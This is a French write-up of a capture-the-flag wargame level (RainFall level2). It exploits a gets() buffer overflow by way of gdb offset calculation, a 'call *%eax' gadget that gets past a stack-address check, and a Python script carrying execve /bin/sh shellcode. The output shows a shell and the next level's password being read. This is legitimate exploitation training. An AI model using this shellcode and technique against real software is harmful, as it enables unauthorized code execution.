    __               _____ 
   / /__ _   _____  / /__ \
  / / _ \ | / / _ \/ /__/ /
 / /  __/ |/ /  __/ // __/ 
/_/\___/|___/\___/_//____/


On lance le binaire et on se rend compte qu'il duplique ce que l'on écrit sur l'entrée standard.

On constate de nouveau la présence de la fonction gets().  Or comme stipulée précédemment cette 
dernière est sujet à une faille que nous pouvons exploiter via un “buffer overflow”.

Calculons la taille du buffer (EIP - start of buffer)

$> (gdb) x $ebp-0x4c
0xbffff69c:	 'A' <repeats 12 times>

$> (gdb) info frame
Stack level 0, frame at 0xbffff6f0:
 …
 Saved registers:
  ebp at 0xbffff6e8, eip at 0xbffff6ec

$>(gdb) p/d 0xbffff6ec - 0xbffff69c
$1 = 80

On a donc un offset de 80.

Cependant il ne sera pas possible de procéder de la meme façon qu’avant, en effet on peut voir 
que EIP SAVED est soumise à une verification :

$> (gdb) disas p

0x080484f2 <+30>:	mov    0x4(%ebp),%eax			(1) EIP SAVED (ebp + 0x4) est stockée dans EAX
….
0x080484fb <+39>:	and     $0xb0000000,%eax		(2) Operation logique 
0x08048500 <+44>:	cmp    $0xb0000000,%eax 		(3) Comparaison
0x08048505 <+49>:	jne      0x8048527 <p+83>
….
0x08048522 <+78>:	call   0x80483d0 <_exit@plt>		(4) Exit
0x08048527 <+83>:	lea    -0x4c(%ebp),%eax 

Cette verification nous rends impossible la réécriture de EIP SAVED par une adresse de la stack 
car toute les adresses de la stack sont de la forme 0xbXXXXXXX, ce qu’on peut voir ici:

$> (gdb) info proc map

Start Addr 	End Addr          Size               Offset objfile
0xbffdf000 	0xc0000000    0x21000        0x0 [stack]

On remarque, en mettant un break  sur le return de la fonction <p> que notre registre EAX contient 
l’adresse de notre buffer :

$> disas
…
      0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
      0x0804853d <+105>:	leave
=> 0x0804853e <+106>:	ret
End of assembler dump.

$> (gdb) i r eax
eax            0x804a008	134520840

$> (gdb) x/s 0x804a008
0x804a008:	 "This is my input"

Il serait donc possible d’exécuter un shellcode contenu dans notre buffer si nous pouvions 
réécrire EIP SAVED avec l’adresse d’une instruction faisant appel à EAX.

Cherchons l’adresse d’une instruction hors stack qui fait appel au registre EAX :

level2@RainFall:~$ objdump -d level2 | grep 'call' | grep 'eax'
 
 8048488:	ff 14 85 50 97 04 08 	call   *0x8049750(,%eax,4)
 80484cf:	ff d0                	call   *%eax
 80485eb:	ff d0                	call   *%eax

Nous utiliserons 080484cf.

Nous avons notre offset (80), l’adresse d’une instruction qui appelle EAX (80484cf), un shellcode … Let’s do it :

****************************************************************************************************
#!/usr/bin/env python

shellcode="\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89
\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e
\x41\x41\x41\x41\x42\x42\x42\x42"

payload=shellcode+(80-len(shellcode))*"A"+"\xcf\x84\x04\x08"

print payload
****************************************************************************************************

level2@RainFall:~$ python script > hack
level2@RainFall:~$ cat test - | ./level2
1��F1�1�̀�[1��C��C
                 �
                  ��S
                      ̀�����/bin/shNAAAABBBBAAAAAAAAAAAAAAAAAAAAA�
#whoami
#level3
#cat /home/user/level3/.pass
#492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

Next …
